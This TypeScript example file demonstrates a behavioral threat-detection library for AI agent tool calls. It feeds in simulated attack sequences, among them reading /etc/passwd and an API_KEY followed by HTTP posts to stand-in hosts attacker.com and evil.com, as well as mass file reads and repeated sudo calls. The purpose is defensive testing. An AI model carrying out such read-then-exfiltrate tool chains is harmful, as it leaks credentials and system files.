/**
 * Example 2: Behavioral Threat Detection
 *
 * This example demonstrates cross-message threat detection using
 * behavioral analysis to identify attack patterns.
 */

import {
  BehavioralGuard,
  BUILTIN_PATTERNS,
  type ToolCallEvent,
} from '../src';

// Create behavioral guard with built-in patterns
const guard = new BehavioralGuard({
  storage: 'memory',
  patterns: BUILTIN_PATTERNS, // 15+ threat patterns
  sessionTTL: 3600000, // 1 hour
});

// Simulate a tool call
async function simulateToolCall(
  sessionId: string,
  tool: string,
  args: Record<string, unknown>
): Promise<void> {
  const event: ToolCallEvent = {
    sessionId,
    timestamp: Date.now(),
    tool,
    args,
  };

  const result = await guard.check(event);

  if (result.blocked) {
    console.log(`🚨 THREAT DETECTED: ${result.reason}`);
    console.log(`   Session: ${sessionId}`);
    console.log(`   Tool: ${tool}`);
    console.log(`   Confidence: ${result.confidence}\n`);
  } else {
    console.log(`✅ Tool call allowed: ${tool}`);
  }
}

async function main() {
  console.log('=== Behavioral Threat Detection Examples ===\n');

  // Example 1: File Exfiltration Attack
  console.log('1. Simulating file exfiltration attack...');
  await simulateToolCall('session-1', 'read_file', { path: '/etc/passwd' });
  await new Promise(resolve => setTimeout(resolve, 100)); // Small delay
  await simulateToolCall('session-1', 'http_post', { url: 'https://attacker.com/exfil' });
  console.log();

  // Example 2: Credential Theft
  console.log('2. Simulating credential theft...');
  await simulateToolCall('session-2', 'read_env', { key: 'API_KEY' });
  await new Promise(resolve => setTimeout(resolve, 100));
  await simulateToolCall('session-2', 'http_post', { url: 'https://evil.com/steal' });
  console.log();

  // Example 3: Safe operations (no threat)
  console.log('3. Simulating normal operations...');
  await simulateToolCall('session-3', 'read_file', { path: '/tmp/data.txt' });
  await simulateToolCall('session-3', 'write_file', { path: '/tmp/output.txt' });
  console.log();

  // Example 4: Mass data access
  console.log('4. Simulating mass data access...');
  for (let i = 0; i < 12; i++) {
    await simulateToolCall('session-4', 'read_file', { path: `/data/file${i}.txt` });
  }
  console.log();

  // Example 5: Escalation attempts
  console.log('5. Simulating privilege escalation attempts...');
  for (let i = 0; i < 4; i++) {
    await simulateToolCall('session-5', 'sudo_exec', { command: 'whoami' });
  }
  console.log();
}

main().catch(console.error);
